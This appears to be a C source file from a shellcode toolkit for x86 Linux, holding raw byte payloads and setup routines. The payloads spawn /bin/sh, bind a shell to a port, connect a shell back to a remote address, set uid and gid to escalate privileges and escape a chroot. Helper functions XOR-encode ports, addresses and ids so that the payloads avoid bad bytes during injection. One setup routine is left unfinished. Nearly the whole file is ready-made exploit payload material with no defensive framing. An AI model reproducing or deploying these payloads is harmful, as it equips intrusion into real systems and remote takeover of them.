/* FIXME: needs cleanup -sc
 */

#include <stdio.h>
#include <string.h>
#include <netinet/in.h>
#include "shellcode.h"


/* ATTENTION: this must be first of concated shellcodes and the last
              one must be terminated with x86_TERMINATOR */
shellcode	x86_linux_spset = {
	"x86-linux-spset",
	20,
	"\xb8\x78\x56\x34\x12\x99\xb6\x02\x5b\x53\x44\x4a"
	"\x74\x06\x39\xc3\x74\xf3\xeb\xf4",
};


shellcode	x86_linux_execvesh = {
	"x86-linux-execvesh",
	23,
	"\x6a\x0b\x58\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f"
	"\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80",
};


shellcode	x86_linux_exit = {
	"x86-linux-exit",
	5,
	"\x31\xc0\x40\xcd\x80",
};


shellcode	x86_linux_setgid = {
	"x86-linux-setgid",
	14,
	"\x6a\x2e\x58\x66\xbb\x41\x41\x66\x81\xf3\x42\x42"
	/*	               ^^  ^^ xor'ed with  ^^  ^^ is the uid */
	"\xcd\x80",
};


shellcode	x86_linux_setuid = {
	"x86-linux-setuid",
	14,
	"\x6a\x17\x58\x66\xbb\x41\x41\x66\x81\xf3\x42\x42"
	/*	               ^^  ^^ xor'ed with  ^^  ^^ is the uid */
	"\xcd\x80",
};


shellcode	x86_linux_setreuid = {
	"x86-linux-setreuid",
	23,
	"\x6a\x46\x58\x66\xbb\x41\x41\x66\x81\xf3\x41\x41"
	/*	               ^^  ^^              ^^  ^^	*/
	"\x66\xb9\x42\x42\x66\x81\xf1\x42\x42\xcd\x80",
	/*         ^^  ^^              ^^  ^^		*/
};


shellcode	x86_linux_chmod = {
	"x86-linux-chmod",
	22,
	"\xeb\x0f\x31\xc0\x5b\x88\x43\x00"
	/*			       ^^ file name length	*/
	"\xb9\x41\x41\x41\x41\xb0\x0f\xcd\x80\xe8\xec\xff"
	/*     ^^  ^^  ^^  ^^ mode				*/
	"\xff\xff",
};


shellcode	x86_linux_chroot = {
	"x86-linux-chroot",
	42,
	"\x99\xb9\x50\x73\x50\x73\x50\x68\x41\x41\x2e\x2e"
	"\x89\xe3\xb0\x27\xcd\x80\xb0\x3d\xcd\x80\x80\xc3"
	"\x02\xfe\xc2\xb0\x0c\xcd\x80\x80\xfa\x6a\x75\xf5"
	"\xfe\xc3\xb0\x3d\xcd\x80",
};


shellcode	x86_linux_portshellsh = {
	"x86-linux-portshellsh",
	94,
	"\x31\xc0\x99\x50\xfe\xc0\x89\xc3\x50\xfe\xc0\x50"
	"\x89\xe1\xb0\x66\xcd\x80\x52\x66\x68\x50\x73\x66"
	/*				       ^^  ^^		*/
	"\x52\x89\xe2\x6a\x10\x52\x50\x89\xe1\xfe\xc3\x89"
	"\xc2\xb0\x66\xcd\x80\x80\xc3\x02\xb0\x66\xcd\x80"
	"\x50\x52\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3"
	"\x31\xc9\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80"
	"\xb0\x0b\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
	"\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80",
};


shellcode	x86_linux_connectsh = {
	"x86-linux-connectsh",
	88,
	"\x31\xc0\x99\x50\xfe\xc0\x89\xc3\x50\xfe\xc0\x50"
	"\x89\xe1\xb0\x66\xcd\x80\xb9\x41\x41\x41\x41\x81"
	/*			       ^^  ^^  ^^  ^^		*/
	"\xf1\x3e\x41\x41\x40\x51\x66\x68\x50\x74\x66\x52"
	/*     ^^  ^^  ^^  ^^		   ^^  ^^		*/
	"\x89\xe1\x89\xc2\x6a\x10\x51\x52\x89\xe1\xb3\x03"
	"\xb0\x66\xcd\x80\x89\xd3\x31\xc9\xb0\x3f\xcd\x80"
	"\xfe\xc1\xb0\x3f\xcd\x80\xb0\x0b\x99\x52\x68\x6e"
	"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53"
	"\x89\xe1\xcd\x80",
};


shellcode	x86_linux_read = {
	"x86-linux-read",
	16,
	"\xeb\x0e\xb2\xfa\x59\x6a\x41\x5b\x80\xf3\x41\x6a"
	"\x03\x58\xcd\x80",
};


shellcode	*x86_linux_shellcodes[] = {
	&x86_linux_chmod,
	&x86_linux_chroot, 
	&x86_linux_connectsh,
	&x86_linux_execvesh,
	&x86_linux_exit,
	&x86_linux_portshellsh,
	&x86_linux_read,
	&x86_linux_setgid,
	&x86_linux_setuid,
	&x86_linux_setreuid,
	&x86_linux_spset,
	NULL,
};


arch	x86_linux = {
	"x86-linux",
        1,
	NULL,	/* for nops use the same function as in arch bsd */
	x86_linux_shellcodes
};


int
isLegal (unsigned char x)		/* XXX: Move this to a global position */
{
	switch (x) {
		case 0x00:
		case 0x0a:
		case 0x0d:
		case 0x25:
	return 0;
	}
	return 1;
}


unsigned short int
getxorer (unsigned short int value)
{
	unsigned short int xor = 0x8f8f, temp;
	

	temp = (xor ^ value) & 0xff00; 
	switch (temp) {
	    case 0x0000 : 
	    case 0x0a00 :
	    case 0x0d00 :
	    case 0x2500 : xor^=0x8000; 
	                  break;
	}

	temp = (xor ^ value) & 0xff; 
	switch (temp) {
	    case 0x00 : 
	    case 0x0a :
	    case 0x0d :
	    case 0x25 : xor^=0x80; 
	                break;
	}
	
	return xor;
}


unsigned long int
getxorer4 (unsigned long int v)
{
	unsigned long int	xor = 0x8f8f8f8f,
				temp,
				x;


	for (x = 0; x < 4; x++) {
		temp = ((xor ^ v) >> (x * 8)) & 0xff;
		if (!isLegal (temp)) {
			xor ^= (0x80 << (x * 8));
		}
	}

	return xor;
}


void
x86_linux_chmod_setup (unsigned char *code, unsigned char *file,
	unsigned long int mode)
{
	unsigned char	length = 0;


	length = strlen (file);
	if (length > 255 || !isLegal (length))  {
		printf ("Change length of file name. code will be left unchanged.\n");
		return;
	}
	code[7] = length;

/* XXX: WRITE ME! */

	return;
}


void
x86_linux_setgid_setup (unsigned char *code, unsigned short int gid)
{
	unsigned short	xor = 0;


        xor = getxorer (gid);

        code[10] = xor & 0xff;
	code[11] = (xor >> 8) & 0xff;
	
	gid ^=	xor;

	code[5] = gid & 0xff;
	code[6] = (gid >> 8) & 0xff;

	return;
}


void
x86_linux_setuid_setup (unsigned char *code, unsigned short int uid)
{
	unsigned short	xor = 0;


        xor = getxorer (uid);

        code[10] = xor & 0xff;
	code[11] = (xor >> 8) & 0xff;
	
	uid ^=	xor;

	code[5] = uid & 0xff;
	code[6] = (uid >> 8) & 0xff;

	return;
}


void
x86_linux_setreuid_setup (unsigned char *code,
	unsigned short int ruid, unsigned short int euid)
{
	unsigned short	xor_a = 0,
			xor_b = 0;


	xor_a = getxorer (ruid);
	xor_b = getxorer (euid);

	code[10] = xor_a & 0xff;
	code[11] = (xor_a >> 8) & 0xff;

	code[19] = xor_b & 0xff;
	code[20] = (xor_b >> 8) & 0xff;

	ruid ^= xor_a;
	euid ^= xor_b;

	code[5] = ruid & 0xff;
	code[6] = (ruid >> 8) & 0xff;

	code[14] = euid & 0xff;
	code[15] = (euid >> 8) & 0xff;

	return;
}


void
x86_linux_portshell_setup (unsigned char *code, unsigned short int port)
{
	port = htons (port);

	if (!isLegal(port & 0xff) || !isLegal((port & 0xff00) >> 8))  {
		printf ("Error:\t choosen port would produced illegal bytes.\n");
		printf ("\t code will be left unchanged.\n");
		return;
	}

	code[22] = (port >> 8) & 0xff;
	code[21] = port & 0xff;

	return;
}


void
x86_linux_connectshell_setup (unsigned char *code,
	unsigned long int raddr,
	unsigned short int rport)
{
	unsigned long int	raddr_xor = 0;


	rport = htons (rport);
	if (!isLegal(rport & 0xff) || !isLegal((rport & 0xff00) >> 8))  {
		printf ("Error:\t choosen remote port would produced illegal bytes.\n");
		printf ("\t code will be left unchanged.\n");

		return;
	}

	raddr_xor = getxorer4 (raddr);

	raddr ^= raddr_xor;

	code[22] = (raddr_xor >> 24) & 0xff;
	code[21] = (raddr_xor >> 16) & 0xff;
	code[20] = (raddr_xor >> 8) & 0xff;
	code[19] = raddr_xor & 0xff;

	code[28] = (raddr >> 24) & 0xff;
	code[27] = (raddr >> 16) & 0xff;
	code[26] = (raddr >> 8) & 0xff;
	code[25] = raddr & 0xff;

	code[33] = (rport >> 8) & 0xff;
	code[32] = rport & 0xff;

	return;
}


